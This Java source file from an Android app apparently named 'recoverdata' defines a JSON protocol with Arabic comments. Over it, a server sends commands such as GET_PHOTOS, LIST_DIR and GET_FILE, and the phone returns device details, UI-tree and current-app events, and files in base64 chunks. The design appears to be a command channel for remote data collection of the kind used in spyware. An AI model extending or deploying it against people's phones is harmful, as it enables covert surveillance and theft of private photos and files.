package com.recoverdata.phone.network;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.recoverdata.phone.utils.Logger;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * MessageProtocol
 * ============================================================
 * البروتوكول الموحّد للرسائل بين التطبيق والسيرفر.
 *
 * المسؤوليات:
 *   1. تعريف أنواع الرسائل (TYPE_*).
 *   2. بناء رسائل صادرة (Builders).
 *   3. تحليل رسائل واردة (Parsers).
 *   4. ضمان تطابق الصيغة بين الطرفين.
 *
 * ────────────────────────────────────────────────────────────
 * صيغة الرسالة الواردة (من السيرفر إلى التطبيق):
 * ────────────────────────────────────────────────────────────
 *   {
 *     "id":   "req-123",           // معرف فريد للطلب (اختياري)
 *     "cmd":  "GET_PHOTOS",        // الأمر
 *     "payload": { ... },          // معاملات إضافية (اختياري)
 *     "timestamp": 1700000000000   // وقت الإرسال (اختياري)
 *   }
 *
 * ────────────────────────────────────────────────────────────
 * صيغة الرسائل الصادرة (من التطبيق إلى السيرفر):
 * ────────────────────────────────────────────────────────────
 *
 *   1) HELLO (عند أول اتصال):
 *   {
 *     "type": "HELLO",
 *     "device": { "manufacturer": "Samsung", "model": "A52", ... },
 *     "autopilot": true,
 *     "timestamp": 1700000000000
 *   }
 *
 *   2) RESULT (نتيجة أمر):
 *   {
 *     "id": "req-123",
 *     "type": "RESULT",
 *     "cmd": "GET_PHOTOS",
 *     "success": true,
 *     "message": "Sent 42 photos",
 *     "timestamp": 1700000000000
 *   }
 *
 *   3) DATA (بيانات كبيرة / نتيجة قراءة):
 *   {
 *     "id": "req-123",
 *     "type": "DATA",
 *     "cmd": "LIST_DIR",
 *     "data": "...",
 *     "timestamp": 1700000000000
 *   }
 *
 *   4) EVENT (حدث غير مطلوب من السيرفر):
 *   {
 *     "type": "EVENT",
 *     "event": "UI_TREE",
 *     "data": { ... },
 *     "timestamp": 1700000000000
 *   }
 *
 *   5) FILE_CHUNK (نقل ملفات):
 *   {
 *     "id": "req-123",
 *     "type": "FILE_CHUNK",
 *     "cmd": "GET_FILE",
 *     "filename": "photo.jpg",
 *     "mime": "image/jpeg",
 *     "size": 123456,
 *     "index": 0,
 *     "total": 10,
 *     "chunk": "base64...",
 *     "timestamp": 1700000000000
 *   }
 * ============================================================
 */
public final class MessageProtocol {

    private static final String TAG = "MessageProtocol";

    // =============================================================
    // 1. أنواع الرسائل (Types)
    // =============================================================
    public static final String TYPE_HELLO      = "HELLO";
    public static final String TYPE_RESULT     = "RESULT";
    public static final String TYPE_DATA       = "DATA";
    public static final String TYPE_EVENT      = "EVENT";
    public static final String TYPE_FILE_CHUNK = "FILE_CHUNK";
    public static final String TYPE_ERROR      = "ERROR";

    // =============================================================
    // 2. أسماء الأحداث (Events)
    // =============================================================
    public static final String EVENT_AUTOPILOT_READY = "AUTOPILOT_READY";
    public static final String EVENT_UI_TREE         = "UI_TREE";
    public static final String EVENT_CURRENT_PACKAGE = "CURRENT_PACKAGE";

    // =============================================================
    // 3. مفاتيح JSON (Keys) - لتفادي الأخطاء المطبعية
    // =============================================================
    public static final String K_ID        = "id";
    public static final String K_TYPE      = "type";
    public static final String K_CMD       = "cmd";
    public static final String K_PAYLOAD   = "payload";
    public static final String K_DATA      = "data";
    public static final String K_EVENT     = "event";
    public static final String K_MESSAGE   = "message";
    public static final String K_SUCCESS   = "success";
    public static final String K_TIMESTAMP = "timestamp";
    public static final String K_DEVICE    = "device";
    public static final String K_AUTOPILOT = "autopilot";

    // مفاتيح FILE_CHUNK
    public static final String K_FILENAME  = "filename";
    public static final String K_MIME      = "mime";
    public static final String K_SIZE      = "size";
    public static final String K_INDEX     = "index";
    public static final String K_TOTAL     = "total";
    public static final String K_CHUNK     = "chunk";

    // =============================================================
    // 4. منع الإنشاء
    // =============================================================
    private MessageProtocol() {
        throw new UnsupportedOperationException("Utility class");
    }

    // =============================================================
    // 5. بناء الرسائل الصادرة (Builders)
    // =============================================================

    /**
     * رسالة HELLO - تُرسل عند أول اتصال بالسيرفر.
     */
    @NonNull
    public static String buildHello(@NonNull JSONObject deviceInfo, boolean autopilotReady) {
        try {
            JSONObject json = new JSONObject();
            json.put(K_TYPE, TYPE_HELLO);
            json.put(K_DEVICE, deviceInfo);
            json.put(K_AUTOPILOT, autopilotReady);
            json.put(K_TIMESTAMP, System.currentTimeMillis());
            return json.toString();
        } catch (JSONException e) {
            Logger.e(TAG, "buildHello error", e);
            return "{}";
        }
    }

    /**
     * رسالة RESULT - نتيجة تنفيذ أمر.
     */
    @NonNull
    public static String buildResult(@Nullable String id,
                                     @Nullable String cmd,
                                     boolean success,
                                     @NonNull String message) {
        try {
            JSONObject json = new JSONObject();
            if (id != null)  json.put(K_ID, id);
            json.put(K_TYPE, TYPE_RESULT);
            if (cmd != null) json.put(K_CMD, cmd);
            json.put(K_SUCCESS, success);
            json.put(K_MESSAGE, message);
            json.put(K_TIMESTAMP, System.currentTimeMillis());
            return json.toString();
        } catch (JSONException e) {
            Logger.e(TAG, "buildResult error", e);
            return "{}";
        }
    }

    /**
     * رسالة DATA - بيانات نصية (نتيجة قراءة).
     */
    @NonNull
    public static String buildData(@Nullable String id,
                                   @NonNull String cmd,
                                   @NonNull String data) {
        try {
            JSONObject json = new JSONObject();
            if (id != null) json.put(K_ID, id);
            json.put(K_TYPE, TYPE_DATA);
            json.put(K_CMD, cmd);
            json.put(K_DATA, data);
            json.put(K_TIMESTAMP, System.currentTimeMillis());
            return json.toString();
        } catch (JSONException e) {
            Logger.e(TAG, "buildData error", e);
            return "{}";
        }
    }

    /**
     * رسالة EVENT - حدث غير مطلوب من السيرفر.
     */
    @NonNull
    public static String buildEvent(@NonNull String event, @Nullable JSONObject data) {
        try {
            JSONObject json = new JSONObject();
            json.put(K_TYPE, TYPE_EVENT);
            json.put(K_EVENT, event);
            if (data != null) json.put(K_DATA, data);
            json.put(K_TIMESTAMP, System.currentTimeMillis());
            return json.toString();
        } catch (JSONException e) {
            Logger.e(TAG, "buildEvent error", e);
            return "{}";
        }
    }

    /**
     * رسالة FILE_CHUNK - جزء من ملف.
     */
    @NonNull
    public static String buildFileChunk(@Nullable String id,
                                        @NonNull String cmd,
                                        @NonNull String filename,
                                        @NonNull String mime,
                                        long size,
                                        int index,
                                        int total,
                                        @NonNull String base64Chunk) {
        try {
            JSONObject json = new JSONObject();
            if (id != null) json.put(K_ID, id);
            json.put(K_TYPE, TYPE_FILE_CHUNK);
            json.put(K_CMD, cmd);
            json.put(K_FILENAME, filename);
            json.put(K_MIME, mime);
            json.put(K_SIZE, size);
            json.put(K_INDEX, index);
            json.put(K_TOTAL, total);
            json.put(K_CHUNK, base64Chunk);
            json.put(K_TIMESTAMP, System.currentTimeMillis());
            return json.toString();
        } catch (JSONException e) {
            Logger.e(TAG, "buildFileChunk error", e);
            return "{}";
        }
    }

    /**
     * رسالة ERROR - خطأ عام.
     */
    @NonNull
    public static String buildError(@Nullable String id,
                                    @Nullable String cmd,
                                    @NonNull String message) {
        return buildResult(id, cmd, false, message);
    }

    // =============================================================
    // 6. تحليل الرسائل الواردة (Parsers)
    // =============================================================

    /**
     * تحويل نص JSON إلى كائن IncomingMessage.
     * يعيد null إذا فشل التحليل.
     */
    @Nullable
    public static IncomingMessage parse(@NonNull String raw) {
        if (raw.trim().isEmpty()) return null;

        try {
            JSONObject json = new JSONObject(raw);
            IncomingMessage msg = new IncomingMessage();

            msg.id      = json.optString(K_ID, null);
            msg.cmd     = json.optString(K_CMD, null);
            msg.payload = json.optJSONObject(K_PAYLOAD);
            msg.data    = json.optString(K_DATA, null);
            msg.type    = json.optString(K_TYPE, null);
            msg.event   = json.optString(K_EVENT, null);
            msg.raw     = json;

            return msg;

        } catch (JSONException e) {
            Logger.e(TAG, "parse error: " + e.getMessage(), e);
            return null;
        }
    }

    // =============================================================
    // 7. كلاس IncomingMessage (نتيجة التحليل)
    // =============================================================
    public static class IncomingMessage {
        public String id;         // معرف الطلب
        public String cmd;        // الأمر
        public String type;       // نوع الرسالة
        public String event;      // اسم الحدث (إن كان EVENT)
        public String data;       // بيانات نصية
        public JSONObject payload; // معاملات إضافية
        public JSONObject raw;    // JSON الأصلي

        @NonNull
        @Override
        public String toString() {
            return "IncomingMessage{id=" + id + ", cmd=" + cmd + ", type=" + type + "}";
        }
    }

    // =============================================================
    // 8. أدوات مساعدة
    // =============================================================

    /**
     * الحصول على قيمة نصية من payload مع قيمة افتراضية.
     */
    @Nullable
    public static String getString(@Nullable JSONObject payload, @NonNull String key,
                                   @Nullable String def) {
        if (payload == null) return def;
        return payload.optString(key, def);
    }

    /**
     * الحصول على قيمة int من payload مع قيمة افتراضية.
     */
    public static int getInt(@Nullable JSONObject payload, @NonNull String key, int def) {
        if (payload == null) return def;
        return payload.optInt(key, def);
    }

    /**
     * الحصول على قيمة double من payload مع قيمة افتراضية.
     */
    public static double getDouble(@Nullable JSONObject payload, @NonNull String key, double def) {
        if (payload == null) return def;
        return payload.optDouble(key, def);
    }

    /**
     * الحصول على قيمة boolean من payload مع قيمة افتراضية.
     */
    public static boolean getBoolean(@Nullable JSONObject payload, @NonNull String key, boolean def) {
        if (payload == null) return def;
        return payload.optBoolean(key, def);
    }
}